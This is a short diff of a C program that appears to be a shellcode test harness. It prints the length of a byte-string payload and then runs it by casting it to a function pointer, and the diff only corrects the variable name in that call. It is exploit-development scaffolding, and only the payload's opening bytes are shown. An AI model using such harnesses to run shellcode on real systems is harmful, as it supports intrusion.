@@ -43,6 +43,6 @@ char *shellcode =  "\x01\x60\x8f\xe2"
 
 int main(void) {
     fprintf(stdout,"Length: %d\n",strlen(shellcode));
-    (*(void(*)()) SC)();
+    (*(void(*)()) shellcode)();
 return 0;
 }
